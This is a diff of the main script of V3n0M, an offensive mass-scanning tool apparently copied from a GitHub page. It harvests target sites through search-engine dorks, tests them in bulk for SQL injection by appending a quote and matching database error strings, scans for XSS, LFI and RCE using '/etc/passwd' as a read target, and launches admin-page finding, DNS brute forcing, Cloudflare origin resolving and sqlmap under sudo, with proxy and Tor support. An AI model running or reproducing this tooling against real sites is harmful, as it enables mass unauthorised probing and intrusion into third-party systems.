@@ -1,11 +1,10 @@
-#!/usr/bin/python3
-# -*- coding: latin-1 -*-
-# noinspection PyBroadException
 
+#!/usr/bin/python3
+# -*- coding: UTF-8 -*-
 
 try:
     import re, random, threading, socket, urllib.request, urllib.error, urllib.parse, http.cookiejar, subprocess, \
-        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, codecs
+        time, sys, os, math, itertools, queue, asyncio, aiohttp, argparse, socks, httplib2, requests, zipfile
     from signal import SIGINT, signal
     import bs4, tqdm
     from glob import glob
@@ -14,14 +13,20 @@ try:
     from random import SystemRandom
     from socket import *
     from datetime import *
+    from aiohttp import web
+    from aio_ping import ping
+    import async_timeout
+    import tty
+    import inspect
+    from functools import wraps
+    import toxin
 
-
-except:
+except Exception as verb:
     print("\n|------ PYTHON PROBLEM DETECTED! Recovery Menu Enabled -----| ")
     print(" ")
     print(" ")
     print(" Exception Error Message encountered: "
-          "" + str(Exception))
+          "" + str(verb))
     print(" ")
     print(" ")
     print("|--- You are advised to run either or both steps below   ---| ")
@@ -43,36 +48,60 @@ except:
     if chce == '1':
         sys.stdout.flush()
         print("Warning This will force upgrade all Python3.6 modules")
+        euid = os.geteuid()
+        if euid == 0:
+            print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
+            time.sleep(6)
+            os.kill(os.getpid(), 9)
         print("You will have 10 seconds to cancel this action before the system begins")
         print("Note: This will entirely reinstall all current installed modules aswell to clear possible problems")
         time.sleep(10)
         for dist in pip.get_installed_distributions():
-            call("pip3.6 install --upgrade --no-deps --force-reinstall " + dist.project_name, shell=True)
-            call("pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3.6 install -U",
+            call("pip3 install --upgrade --no-deps --force-reinstall --user " + dist.project_name, shell=True)
+            call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user",
                  shell=True)
-            pass
+            subprocess._cleanup()
         pass
     if chce == '2':
         sys.stdout.flush()
         print(
             "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
+        euid = os.geteuid()
+        if euid == 0:
+            print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
+            time.sleep(6)
+            os.kill(os.getpid(), 9)
         print("You will have 10 seconds to cancel this action before the system begins")
         time.sleep(10)
-        call("pip3.6 install aiohttp --upgrade ", shell=True)
-        call("pip3.6 install asyncio --upgrade ", shell=True)
-        call("pip3.6 install bs4 --upgrade ", shell=True)
-        call("pip3.6 install dnspython --upgrade ", shell=True)
-        call("pip3.6 install tqdm --upgrade ", shell=True)
-        call("pip3.6 install datetime --upgrade ", shell=True)
-        call("pip3.6 install requests --upgrade ", shell=True)
-        call("pip3.6 install socksipy-branch --upgrade ", shell=True)
-        call("pip3.6 install httplib2 --upgrade ", shell=True)
-        call("pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3.6 install -U", shell=True)
-        pass
+        call("pip3 install termcolor --upgrade --user ", shell=True)
+        call("pip3 install aiohttp --upgrade --user ", shell=True)
+        call("pip3 install asyncio --upgrade --user", shell=True)
+        call("pip3 install bs4 --upgrade --user", shell=True)
+        call("pip3 install dnspython --upgrade --user", shell=True)
+        call("pip3 install tqdm --upgrade --user", shell=True)
+        call("pip3 install datetime --upgrade --user", shell=True)
+        call("pip3 install requests --upgrade --user", shell=True)
+        call("pip3 install socksipy-branch --upgrade --user", shell=True)
+        call("pip3 install httplib2 --upgrade --user", shell=True)
+        call("pip3 install aio_ping --upgrade --user", shell=True)
+        call("pip3 install zipfile --upgrade --user", shell=True)
+        call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user", shell=True)
+        subprocess._cleanup()
     if chce == '3':
         exit()
 
 __name__ = '__main__'
+
+
+def donations():
+    import time
+    print(B + "\n---------------------------------------------------------")
+    print(":" + G + "Bitcoin Address:" + R +  "1DdfZzCFFFvRVkyVjG2ZPG7Udu6kMDh7Eb   " + B +" ")
+    print(":" + G + "Etherium Address:" + R + "0x28AeAC2046b39da6A4De06B590c5FE8B0e65e3f0" + B + " ")
+    print(":" + O + "All donations help keep this project going!")
+    print(B + "----------------------------------------------------------")
+    time.sleep(10)
+    fmenu()
 
 
 def logo():
@@ -80,11 +109,11 @@ def logo():
     sql_list_counter()
     lfi_list_counter()
     print(R + "\n----------------------------------------------------------------")
-    print(" Release Date Oct 15th 2017    " + B + "        Author: NovaCygni       " + R + " ")
+    print(" Release Date Dec 25th 2018    " + B + "        Author: NovaCygni       " + R + " ")
     print("        Proxy Enabled " + G + " [", ProxyEnabled, "] " + R + "                               ")
     print("        Cache & Log Status " + B + " [", cachestatus, "] " + R + "           ")
-    print(" " + O + "Features:" + "SQli-Dorker DNS-Bruteforcer AdminPage-Finder " + R + "         ")
-    print("   " + O + "Toxin-Vulnerable-IPs-Scanner Cloudflare-Resolver XSS&LFI>RCE " + R + "")
+    print(" " + O + "Please check the Misc Options for Donations Options, Thankyou " + R + "         ")
+    print(" " + O + "Donating helps keep this project alive and active. " + R + "         ")
     print("                    _____       _____                           ")
     print("          " + G + "         |____ |     |  _  |    " + R + "                      ")
     print("             __   __   / /_ __ | |/' |_ _" + G + "_ ___             " + R + "     ")
@@ -204,9 +233,10 @@ def classicinj(url):
     aug_url = url + "'"
     global sql_list_counter
     global sql_list_count
+    open("sqli_confirmed", "r+", encoding='utf-8')
     try:
         try:
-            resp = urllib.request.urlopen(aug_url)
+            resp = urllib.request.urlopen(aug_url, timeout=2)
         except:  # if response is not Code:200 then instead of passing nothing causing hanging
             resp = str("v3n0m")  # to throw a value to stop null/non-200-status messages hanging the scanner
         hits = str(resp.read())
@@ -462,7 +492,7 @@ def injtest():
     sqli_confirmed = open(os.path.realpath(holder), "a")
     if not customSelected:
         log = "v3n0m-sqli.txt"
-        logfile = open(log, "a")
+        logfile = open(log, "a", encoding='utf-8')
         vb = len(usearch) / int(numthreads)
         i = int(vb)
         m = len(usearch) % int(numthreads)
@@ -487,132 +517,104 @@ def injtest():
     else:
         try:
             log = input('Enter file name and location: ')
-            with open(log) as hodor:
+            with open(log, encoding='utf-8') as hodor:
                 for line in hodor:
                     hold_door = str(line.rstrip())+"'"
                     hold_the_door = line.rstrip()
                     try:
-                        resp = urllib.request.urlopen(hold_door)
+                        resp = urllib.request.urlopen(hold_door, timeout=2)
                         hits = str(resp.read())
                     except: # In event of Exception throw pointless str so scan at least just continues.
                         hits = '0'
                     if str("error in your SQL syntax") in hits:
                         print(hold_the_door + " is vulnerable --> MySQL Classic")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("mysql_fetch") in hits:
+                    if str("mysql_fetch") in hits:
                         print(hold_the_door + " is Vulnerable --> MiscError")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("num_rows") in hits:
+                    if str("num_rows") in hits:
                         print(hold_the_door + " is Vulnerable --> MiscError2")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("ORA-01756") in hits:
+                    if str("ORA-01756") in hits:
                         print(hold_the_door + " is Vulnerable --> Oracle")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Error Executing Database Query") in hits:
+                    if str("Error Executing Database Query") in hits:
                         print(hold_the_door + " is Vulnerable --> JDBC_CFM")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("SQLServer JDBC Driver") in hits:
+                    if str("SQLServer JDBC Driver") in hits:
                         print(hold_the_door + " is Vulnerable --> JDBC_CFM2")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("OLE DB Provider for SQL Server") in hits:
+                    if str("OLE DB Provider for SQL Server") in hits:
                         print(hold_the_door + " is Vulnerable --> MSSQL_OLEdb")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Unclosed quotation mark") in hits:
+                    if str("Unclosed quotation mark") in hits:
                         print(hold_the_door + " is Vulnerabe --> MSSQL_Uqm")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("ODBC Microsoft Access Driver") in hits:
+                    if str("ODBC Microsoft Access Driver") in hits:
                         print(hold_the_door + " is Vulnerable --> MS-Access_ODBC")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Microsoft JET Database") in hits:
+                    if str("Microsoft JET Database") in hits:
                         print(hold_the_door + " is Vulnerable --> MS-Access_JETdb")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Error Occurred While Processing Request") in hits:
+                    if str("Error Occurred While Processing Request") in hits:
                         print(hold_the_door + " is Vulnerable --> Processing Request")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Microsoft JET Database") in hits:
+                    if str("Microsoft JET Database") in hits:
                         print(hold_the_door + " is Vulnerable --> MS-Access JetDb")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Error Occurred While Processing Request") in hits:
+                    if str("Error Occurred While Processing Request") in hits:
                         print(hold_the_door + " is Vulnerable --> Processing Request ")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Server Error") in hits:
+                    if str("Server Error") in hits:
                         print(hold_the_door + " is Vulnerable --> Server Error")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("ODBC Drivers error") in hits:
+                    if str("ODBC Drivers error") in hits:
                         print(hold_the_door + " is Vulnerable --> ODBC Drivers error")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Invalid Querystring") in hits:
+                    if str("Invalid Querystring") in hits:
                         print(hold_the_door + " is Vulnerable --> Invalid Querystring")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("OLE DB Provider for ODBC") in hits:
+                    if str("OLE DB Provider for ODBC") in hits:
                         print(hold_the_door + " is Vulnerable --> OLE DB Provider for ODBC")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("VBScript Runtime") in hits:
+                    if str("VBScript Runtime") in hits:
                         print(hold_the_door + " is Vulnerable --> VBScript Runtime")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("ADODB.Field") in hits:
+                    if str("ADODB.Field") in hits:
                         print(hold_the_door + " is Vulnerable --> ADODB.Field")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("BOF or EOF") in hits:
+                    if str("BOF or EOF") in hits:
                         print(hold_the_door + " is Vulnerable --> BOF or EOF")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("ADODB.Command") in hits:
+                    if str("ADODB.Command") in hits:
                         print(hold_the_door + " is Vulnerable --> ADODB.Command")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("JET Database") in hits:
+                    if str("JET Database") in hits:
                         print(hold_the_door + " is Vulnerable --> JET Database")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("mysql_fetch_array") in hits:
+                    if str("mysql_fetch_array") in hits:
                         print(hold_the_door + " is Vulnerabe --> mysql_fetch_array")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Syntax error") in hits:
+                    if str("Syntax error") in hits:
                         print(hold_the_door + " is Vulnerable --> Syntax error")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("mysql_numrows()") in hits:
+                    if str("mysql_numrows()") in hits:
                         print(hold_the_door + " is Vulnerable --> mysql_numrows()")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("GetArray()") in hits:
+                    if str("GetArray()") in hits:
                         print(hold_the_door + " is Vulnerable --> GetArray()")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("FetchRow()") in hits:
+                    if str("FetchRow()") in hits:
                         print(hold_the_door + " is Vulnerable --> FetchRow()")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
-                    elif str("Input string was not in a correct format") in hits:
+                    if str("Input string was not in a correct format") in hits:
                         print(hold_the_door + " is Vulnerable --> Input String Error")
-                        sql_list_count += 1
                         sqli_confirmed.write("\n" + hold_the_door)
                     else:
                         pass
-        except FileNotFoundError or Exception:
+        except FileNotFoundError or Exception as verb:
             print("Target file not found!")
-            print(Exception)
+            print(str(verb))
             time.sleep(2)
             fmenu()
 
@@ -773,7 +775,7 @@ def fscan():
             i += 1
     numthreads = input('\nEnter no. of threads, Between 50 and 500: ')
     pages_pulled_as_one = input('Enter no. of Search Engine Pages to be scanned per d0rk,  \n'
-                                ' Between 20 and 100, increments of 20. Ie> 20:40:60:80:100   : ')
+                                ' Between 25 and 100, increments of 25. Ie> 25:50:75:100   : ')
     print("\nNumber of SQL errors :", "26")
     print("LFI payloads    :", len(lfis))
     print("XSS payloads    :", len(xsses))
@@ -781,8 +783,7 @@ def fscan():
     print("Threads         :", numthreads)
     print("Dorks           :", len(loaded_Dorks))
     print("Pages           :", pages_pulled_as_one)
-    print("Timeout         :", timeout)
-    time.sleep(5)
+    time.sleep(6)
     loop = asyncio.get_event_loop()
     usearch = loop.run_until_complete(search(pages_pulled_as_one))
     vulnscan()
@@ -803,7 +804,7 @@ def cloud():
         scandepth = "--dept normal"
     elif depth == 3:
         scandepth = "--dept full"
-    cloud = subprocess.Popen('python3.6 ' + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True)
+    cloud = subprocess.Popen('python3 ' + pwd + "/cloudbuster.py " + str(target_site) + scandepth, shell=True)
     cloud.communicate()
     subprocess._cleanup()
     print("Cloud Resolving Finished")
@@ -829,19 +830,18 @@ def vulnscan():
     global rce_log_file
     global xss_log_file
     global vuln
-    lfi_log_file = open("v3n0m-lfi.txt", "a")
-    rce_log_file = open("v3n0m-rce.txt", "a")
-    xss_log_file = open("v3n0m-xss.txt", "a")
+    lfi_log_file = open("v3n0m-lfi.txt", "a", encoding='utf-8')
+    rce_log_file = open("v3n0m-rce.txt", "a", encoding='utf-8')
+    xss_log_file = open("v3n0m-xss.txt", "a", encoding='utf-8')
     endsub = 0
     print(R + "\n[1] SQLi Testing, " + O + "Will verify the Vuln links and print the Injectable URL to the screen")
     print(
         R + "[2] SQLi Testing Auto Mode " + O + "Will attempt to Verify vuln sites then Column count if MySQL detected")
-    print(R + "[3] Launch LFI Suite")
-    print(R + "[4] XSS Testing")
-    print(R + "[5] Save valid Sorted and confirmed vuln urls to file")
-    print(R + "[6] Print all the UNSORTED urls ")
-    print(R + "[7] Print all Sorted and Confirmed Vulns from last scan again")
-    print(R + "[8] Back to main menu")
+    print(R + "[3] XSS Testing")
+    print(R + "[4] Save valid Sorted and confirmed vuln urls to file")
+    print(R + "[5] Print all the UNSORTED urls ")
+    print(R + "[6] Print all Sorted and Confirmed Vulns from last scan again")
+    print(R + "[7] Back to main menu")
     chce = input(":")
     if chce == '1':
         os.system('clear')
@@ -859,20 +859,14 @@ def vulnscan():
         print()
     elif chce == '3':
         os.system('clear')
-        path = os.path.dirname(str(os.path.realpath(__file__)))
-        lfisuite = subprocess.Popen('python3.6 ' + path + "/lfisuite.py ", shell=True)
-        lfisuite.communicate()
-        subprocess._cleanup()
-    elif chce == '4':
-        os.system('clear')
         vuln = []
         xsstest()
         print(B + "\r\x1b[K [*] Scan complete, " + O + str(len(vuln)) + B + " vuln sites found.")
         print()
         endsub = 0
-    elif chce == '5':
+    elif chce == '4':
         print(B + "\nSaving valid urls (" + str(len(finallist)) + ") to file")
-        listname = input("Filename: ")
+        listname = input("Filename: ").encode('utf-8')
         list_name = open(listname, "w", encoding='utf-8')
         finallist.sort()
         for t in finallist:
@@ -880,17 +874,17 @@ def vulnscan():
         list_name.close()
         print("Urls saved, please check", listname)
         endsub = 0
-    elif chce == '6':
+    elif chce == '5':
         print(W + "\nPrinting valid urls:\n")
         finallist.sort()
         for t in finallist:
             print(B + t)
         endsub = 0
-    elif chce == '7':
+    elif chce == '6':
         print(B + "\nVuln found ", len(vuln))
         print(vuln)
         endsub = 0
-    elif chce == '8':
+    elif chce == '7':
         endsub = 1
         fmenu()
     else:
@@ -902,13 +896,13 @@ def vulnscan():
 def ignoringGet(url):
     try:
         try:
-            responce = requests.get(url)
+            responce = requests.get(url, timeout=2)
             responce.raise_for_status()
         except Exception:
             return ''
         return responce.text
-    except Exception:
-        print(Exception)
+    except Exception as verb:
+        print(str(verb))
 
 
 
@@ -919,78 +913,35 @@ def CreateTempFolder(self):
         self.temp += os.sep
 
 
-def upgrade():
-    import time
-    global page
-    global revision
-    try:
-        print(R + ' [+]' + W + ' checking for latest version...')
-        try:
-            sock = ignoringGet(
-                'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
-            page = sock
-            try:
-                if str("Release 412" or "Release 413" or
-                               "Release 44" or "Release 45" or "Release 46" or "Release 47" or "Release 48" or "Release 49"
-                       or "Release 5" or "Release 6" or "Release 7" or "Release 8" or "Release 9") in page:
-                    revision = int(411)
-                else:
-                    revision = current_version
-                    print(R + ' [!]' + W + ' Current version is either Latest or No Update was detected')
-                    time.sleep(4)
-                    pass
-            except KeyboardInterrupt:
-                pass
-        except KeyboardInterrupt:
-            pass
-        if revision >= current_version:
-            print(R + " [!] [Program Debug Info] I did revision as", G + str(revision), R + "and current version as",
-                  G + str(current_version))
-            print(R + ' [!]' + W + ' a new version is ' + G + 'available!' + W)
-            print(R + ' [-]' + W + '   revision:    ' + G + str(revision), 'or Higher Available' + W)
-            response = input(R + ' [+]' + W + ' do you want to upgrade to the latest version? (y/n): ')
-            if not response.lower().startswith('y'):
-                print(R + ' [-]' + W + ' upgrading ' + O + 'aborted' + W)
-                fmenu()
-                return
-            print(R + ' [+] ' + G + 'downloading' + W + ' update...')
-            try:
-                sock = urllib.request.urlopen(
-                    'https://raw.githubusercontent.com/v3n0m-Scanner/V3n0M-Scanner/master/src/v3n0m.py')
-                page = sock.read()
-            except IOError:
-                page = ''
-            if page == '':
-                print(R + ' [+] ' + O + 'unable to download latest version' + W)
-            f = open('v3n0m_new.py', 'w')
-            f.write(page)
-            f.close()
-            this_file = __file__
-            if this_file.startswith('./'):
-                this_file = this_file[2:]
-            f = open('update_v3n0m.sh', 'w')
-            f.write('''#!/bin/sh\n
-                           rm -rf ''' + this_file + '''\n
-                           mv v3n0m_new.py ''' + this_file + '''\n
-                           rm -rf update_v3n0m.sh\n
-                           chmod +x ''' + this_file + '''\n
-                          ''')
-            f.close()
-            returncode = call(['chmod', '+x', 'update_v3n0m.sh'])
-            if returncode != 0:
-                print(R + ' [!]' + O + ' permission change returned unexpected code: ' + str(returncode) + W)
-                fmenu()
-            # Run the script
-            returncode = call(['sh', 'update_v3n0m.sh'])
-            if returncode != 0:
-                print(R + ' [!]' + O + ' upgrade script returned unexpected code: ' + str(returncode) + W)
-                fmenu()
-            print(R + ' [+] ' + G + 'updated!' + W + ' type "./' + this_file + '" to run again')
-        else:
-            pass
-    except Exception:
-        print(R + '\n (^C)' + O + str(Exception) + W)
-    fmenu()
+def progressBar(blocknum, blocksize, totalsize):
+    readsofar = blocknum * blocksize
+    if totalsize > 0:
+        percent = readsofar * 1e2 / totalsize
+        s = "\r%5.1f%% %*d / %d" % (
+            percent, len(str(totalsize)), readsofar, totalsize)
+        sys.stderr.write(s)
+    if readsofar >= totalsize:  # near the end
+        sys.stderr.write("\n")
+
+
+def download(url, file, progressBar=None):
+    print('Downloading %s' % url)
+    urllib.request.urlretrieve(url, file, progressBar)
+
+
+def unzip(file):
+    with zipfile.ZipFile(file+'', 'w') as myzip:
+        myzip.write(file)
+    os.remove(file+'')
+
+downloads = [
+    ['https://www.cloudflare.com/ips-v4', 'ips-v4', progressBar],
+    ['https://www.cloudflare.com/ips-v6', 'ips-v6', progressBar],
+    ['http://crimeflare.net:82/domains/ipout.zip', 'ipout.zip',
+     progressBar]
+]
+
+
 
 
 # noinspection PyBroadException
@@ -1007,11 +958,11 @@ async def search(pages_pulled_as_one):
                 query = dork + "+site:" + site
                 futures = []
                 loop = asyncio.get_event_loop()
-                for i in range(10):
+                for i in range(25):
                     results_web = "http://www.bing.com/search?q=" + query + "&go=Submit&first=" + str(
                         (page + i) * 50 + 1) + "&count=50"
                     futures.append(loop.run_in_executor(None, ignoringGet, results_web))
-                page += 10
+                page += 25
                 stringreg = re.compile('(?<=href=")(.*?)(?=")')
                 names = []
                 for future in futures:
@@ -1020,7 +971,7 @@ async def search(pages_pulled_as_one):
                 domains = set()
                 for name in names:
                     basename = re.search(r"(?<=(://))[^/]*(?=/)", name)
-                    if (basename is None) or any([x.strip() in name for x in search_Ignore.splitlines(keepends=True)]):
+                    if (basename is None) or re.search("google",name) or re.search("facebook",name) or re.search("twitter",name) or re.search("gov",name) or re.search("fbi",name) or re.search("javascript",name) or re.search("stackoverflow",name) or re.search("microsoft",name) or re.search("24img.com",name) or re.search("v3n0m",name) or re.search("venom",name) or re.search("evilzone",name) or re.search("iranhackers",name) or re.search("pastebin",name) or re.search("charity",name) or re.search("school",name) or re.search("learning",name):
                         basename = re.search(r"(?<=://).*", name)
                     if basename is not None:
                         basename = basename.group(0)
@@ -1043,7 +994,7 @@ async def search(pages_pulled_as_one):
                                                    "| Collected urls: %s Since start of scan \n"
                                                    " | D0rks: %s/%s Progressed so far \n"
                                                    " | Percent Done: %s \n"
-                                                   " | Current page no.: <%s> in Cycles of 10 Page results pulled in Asyncio\n"
+                                                   " | Current page no.: <%s> in Cycles of 25 Pages of results pulled in Asyncio\n"
                                                    " | Dork In Progress: %s\n"
                                                    " | Elapsed Time: %s\n" % (R +
                                                                               site, repr(urls_len), progress,
@@ -1096,7 +1047,7 @@ def fmenu():
     logo()
     print("[1] Dork and Vuln Scan")
     print("[2] Admin page finder")
-    print("[3] Toxin - **NOT RELEASED YET: NOT FINISHED: DONT BOTHER TRYING **")
+    print("[3] Toxin - Mass IP/Port/Services Vuln Scanner *Not Released Yet* ")
     print("[4] DNS brute")
     print("[5] Enable Tor/Proxy Support")
     print("[6] Cloudflare Resolving")
@@ -1112,18 +1063,15 @@ def fmenu():
         afsite = input("Enter the site eg target.com: ")
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        findadmin = subprocess.Popen('python3.6 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
+        findadmin = subprocess.Popen('python3 ' + pwd + "/modules/adminfinder.py -w lists/adminlist.txt -u " + str(afsite),
                                      shell=True)
         findadmin.communicate()
         subprocess._cleanup()
 
     elif chce == '3':
+        import time
         print(B)
-        pwd = os.path.dirname(str(os.path.realpath(__file__)))
-        ftpcrawl = subprocess.Popen('python3.6 ' + pwd + "/modules/toxin.py -i " , shell=True)
-        ftpcrawl.communicate()
-        subprocess._cleanup()
-
+        toxin.menu()
     elif chce == '4':
         target_site = input("Enter the site eg target.com: ")
         print("[1] Normal Scan suitable for average sites")
@@ -1137,7 +1085,7 @@ def fmenu():
         print(B)
         pwd = os.path.dirname(str(os.path.realpath(__file__)))
         dnsbrute = subprocess.Popen(
-            'python3.6 ' + pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + att + " -t 200"
+            'python3 ' + pwd + "/modules/dnsbrute.py -w lists/subdomains -u " + str(target_site) + att + " -t 200"
             , shell=True)
         dnsbrute.communicate()
         subprocess._cleanup()
@@ -1164,6 +1112,8 @@ def fmenu():
         print("[3] Print contents of Log files")
         print("[4] Flush Cache and Delete Logs *Warning will erase Toxin Logs/Saves aswell* ")
         print("[5] Perform forced update of ALL installed Python packages and dependancies on system")
+        print("[6] Donations information")
+        print("[7] Start SQLmap *GUI MODE ONLY*")
         print("[0] Return to main menu")
         chce2 = input(":")
         if chce2 == '1':
@@ -1172,7 +1122,7 @@ def fmenu():
             injtest()
         elif chce2 == '2':
             path = os.path.dirname(str(os.path.realpath(__file__)))
-            lfisuite = subprocess.Popen('python3.6 ' + path + "/lfisuite.py ", shell=True)
+            lfisuite = subprocess.Popen('python3 ' + path + "/lfisuite.py ", shell=True)
             lfisuite.communicate()
             subprocess._cleanup()
         elif chce2 == '3':
@@ -1191,26 +1141,39 @@ def fmenu():
             except Exception:
                 print("No Cache or Log Files to delete!")
         elif chce2 == '5':
+            import time
+            euid = os.geteuid()
+            if euid == 0:
+                print("You Cannot perform any upgrades or repairs while logged in with root permissions, please restart v3n0m.")
+                time.sleep(6)
+                killpid()
             import pip
             from subprocess import call
             import time
-            path = os.path.dirname(str(os.path.realpath(__file__)))
             print("Updating V3n0M Module Features First: Cloudbuster files. Please wait.")
             time.sleep(3)
-            cloudupdate = subprocess.Popen(path + "/lists/update.py ", shell=True)
-            cloudupdate.communicate()
-            subprocess._cleanup()
+            for d in downloads:
+                download(d[0], d[1], d[2])
+            unzip('ipout.zip')
+            os.replace(Path('ips-v4'), Path('./lists/ips-v4'))
+            os.replace(Path('ips-v6'), Path('./lists/ips-v6'))
+            print('Everything up to date!')
             print("Cloudbuster features updated!, Moving onto Python Modules and Dependencies...")
             time.sleep(4)
             sys.stdout.flush()
             print(
                 "This will install the missing modules and upgrade them to current versions then update your Python3.6 entirely")
             print("You will have 10 seconds to cancel this action before the system begins")
-            print("sudo is required as these changes are systemwide upgrades/updates for Python")
             time.sleep(10)
-            call("pip3.6 freeze --local | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3.6 install -U",
+            call("pip3 freeze --local --user | grep -v '^\-e' | cut -d = -f 1  | xargs -n1 pip3 install -U --user",
                  shell=True)
+            subprocess._cleanup()
             pass
+        elif chce2 == '6':
+            donations()
+        elif chce2 == '7':
+            from subprocess import call
+            call("sudo sqlmap --wizard", shell=True)
         elif chce2 == '0':
             fmenu()
 
@@ -1231,6 +1194,7 @@ random.shuffle(lfis)
 
 # noinspection PyBroadException
 def enable_proxy():
+    import time
     global ProxyEnabled
     try:
         requiresID = bool(
@@ -1251,7 +1215,9 @@ def enable_proxy():
                     socks.socket = socks.socksocket
                     print(" Socks 4 Proxy Support Enabled")
                     ProxyEnabled = str("True ")
-                except Exception:
+                except Exception as verb:
+                    print(str(verb))
+                    time.sleep(5)
                     pass
             else:
                 try:
@@ -1259,7 +1225,9 @@ def enable_proxy():
                     socks.socket = socks.socksocket
                     print(" Socks 4 Proxy Support Enabled")
                     ProxyEnabled = str("True ")
-                except Exception:
+                except Exception as verb:
+                    print(str(verb))
+                    time.sleep(5)
                     pass
         elif proxytype == str("socks5"):
             if requiresID:
@@ -1270,7 +1238,9 @@ def enable_proxy():
                     print(" Socks 5 Proxy Support Enabled")
                     socks.socket = socks.socksocket
                     ProxyEnabled = str("True ")
-                except Exception:
+                except Exception as verb:
+                    print(str(verb))
+                    time.sleep(5)
                     pass
             else:
                 try:
@@ -1278,22 +1248,13 @@ def enable_proxy():
                     socks.socket = socks.socksocket
                     print(" Socks 5 Proxy Support Enabled")
                     ProxyEnabled = str("True ")
-                except Exception:
+                except Exception as verb:
+                    print(str(verb))
+                    time.sleep(5)
                     pass
     except Exception:
         pass
 
-
-try:
-    codecs.lookup('mbcs')
-except LookupError:
-    ascii_encoding = codecs.lookup('latin-1')
-
-    def mbcs_bypass(name, encoding=ascii_encoding):
-        if name == "mbcs":
-            return encoding
-
-    codecs.register(mbcs_bypass)
 
 # Colours
 W = "\033[0m"
@@ -1318,33 +1279,53 @@ def cache_Check():
 
 def sql_list_counter():
     global sql_count
-    f = open("sqli_confirmed")
-    l = [x for x in f.readlines() if x != "\n"]
-    sql_count = (len(l))
+    try:
+        f = open("v3n0m-sqli.txt", encoding='utf-8')
+        l = [x for x in f.readlines() if x != "\n"]
+        sql_count = (len(l))
+    except FileNotFoundError:
+        sql_count = 0
 
 
 def lfi_list_counter():
     global lfi_count
-    f = open("lfi_confirmed")
-    l = [x for x in f.readlines() if x != "\n"]
-    lfi_count = (len(l))
+    try:
+        f = open("v3n0m-lfi.txt", encoding='utf-8')
+        l = [x for x in f.readlines() if x != "\n"]
+        lfi_count = (len(l))
+    except FileNotFoundError:
+        lfi_count = 0
 
-
-
+list_count = 0
+lfi_count = 0
 subprocess.call("clear", shell=True)
 arg_end = "--"
 arg_eva = "+"
 colMax = 60  # Change this at your will
 endsub = 1
 gets = 0
-timeout = 7
 file = "/etc/passwd"
 ProxyEnabled = False
 menu = True
-current_version = str("420  ")
+current_version = str("425  ")
 while True:
     fmenu()
 
 
 
 
+    © 2019 GitHub, Inc.
+    Terms
+    Privacy
+    Security
+    Status
+    Help
+
+    Contact GitHub
+    Pricing
+    API
+    Training
+    Blog
+    About
+
+Press h to open a hovercard with more details.
